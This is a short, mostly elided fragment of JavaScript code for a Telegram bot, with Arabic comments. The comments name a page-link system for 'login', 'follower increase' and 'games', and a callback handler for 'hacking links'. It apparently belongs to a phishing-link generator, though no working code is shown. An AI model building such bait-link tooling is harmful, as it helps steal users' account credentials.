...
// --- نظام إدارة روابط الصفحات الجديد (تسجيل دخول + زيادة متابعين + ألعاب) ---
...
bot.on('callback_query', async (query) => {
    ...
    // ========== 2. معالج روابط الاختراق (بالشكل الجديد) ==========
